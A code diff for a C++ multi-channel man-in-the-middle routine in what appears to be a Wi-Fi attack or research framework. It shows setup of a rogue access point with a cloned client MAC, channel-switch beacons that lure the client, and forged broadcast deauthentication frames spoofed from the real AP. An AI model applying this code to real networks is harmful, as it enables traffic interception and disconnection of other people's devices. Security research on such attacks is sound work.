@@ -116,17 +116,15 @@ void McMitm::configure_interfaces(){
 }
 
 void McMitm::setup_real_AP_RSN_frames(){
-	rogue_sta->set_iface_up();//FIXME nechtj9 nějaké interface up pro změnu kanálu? není ttu už dwn?
-	rogue_sta->set_channel(netconfig.real_channel);
+	// FIXME nechtj9 nějaké interface up pro změnu kanálu? není ttu už dwn?
+
 	rogue_sta->set_iface_up();
+	rogue_sta->set_channel(netconfig.real_channel);
 
 	// get real AP beacon
 	beacon = scan::RSN_scan(rogue_sta.get(SK::iface), 20, ap.get(SK::mac), std::nullopt, rogue_sta[SK::netns]); //TODO hardcoded tscan_timeout
-	if(!beacon){
-		log(LogLevel::ERROR,
-			"No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?", ap.get(SK::ssid));
-		return;
-	}
+	if(!beacon)
+		throw run_err("No beacon received of network <{}>. Is monitor mode working? Did you enter the correct SSID?", ap.get(SK::ssid));
 
 	log(LogLevel::INFO, "Monitor mode: using {} on real channel and {} on rogue channel.", rogue_sta.get(SK::iface),
 		rogue_ap.get(SK::iface));
@@ -152,35 +150,27 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	// Now that we know the AP channel, put the monitor interface in active ACK mode
 	// for ACK back to AP
 
-	//FIXME set_monitor_active ničí channel ()
-	// const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(rogue_sta.get(SK::iface), netconfig.real_channel);
-	const bool start_nic_real_ap = true;
-
 	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
-	if(start_nic_real_ap){
+	if(rogue_sta[BK::active_monitor]){ //FIXME not supported yet,_RSN_frames dont work with active
+		rogue_sta->set_iface_down();
+		rogue_sta->set_mac_address(client_state.get_mac());
+		rogue_sta->set_monitor_mode(true);
+		//hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
+		//this_thread::sleep_for(seconds(15));
+		//rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
+		rogue_sta->set_iface_up();
+	} else{
 		rogue_sta->set_mac_address(client_state.get_mac());
 		// client need to ACK -> AP
 		start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
-	} else{
-		hw_capabilities::set_iface_down(nic_client_ap, rogue_sta[SK::netns]);
-		rogue_sta->set_mac_address(client_state.get_mac());
-		hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
-		this_thread::sleep_for(seconds(15));
-		rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
 	}
 
 	/*rogue_sta->set_iface_down(); //TODO chenge to set_channel
 	rogue_sta->set_channel(Channel{netconfig.real_channel.ch_num, WifiBand::BAND_2_4, nullopt});
 	rogue_sta->set_iface_up();*/
 
-
-	//FIXME change to wlan host or add comment
-	string bpf = "(wlan addr1 " + ap.get(SK::mac) + ") or (wlan addr2 " +  ap.get(SK::mac) + ")";
-	bpf += " or (wlan addr1 " + client_state.get_mac().to_string() + ") or (wlan addr2 " + client_state.get_mac().
-			to_string() + ")";
-	bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";
-
 	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
+	const string bpf = "(wlan type data or mgt) and (wlan host " +  ap.get(SK::mac) + " or wlan host " +  sta.get(SK::mac) + ")";
 	sock_real->set_filter(bpf);
 
 	// set up the rogue AP and interfaces
@@ -198,16 +188,14 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
 	this_thread::sleep_for(seconds(1));
 
-	rs.start_observers();
+	rs.start_observers(); //after preparation for mc_mitm
 
 	// first disconnect
 	send_csa_beacon(4);
 	client_state.update_state(ClientState::Sent_to_rogue);
 
-	// only for non MFP requests
-	Dot11Deauthentication deauth{};
-	deauth.addr1(HWAddress<6>::broadcast);
-	deauth.addr2(ap.get(SK::mac));
+	// only for non MFP requests, AP -> broadcast
+	Dot11Deauthentication deauth(HWAddress<6>::broadcast, ap.get(SK::mac));
 	deauth.addr3(ap.get(SK::mac));
 	deauth.reason_code(3);
 	send_to_real(deauth);
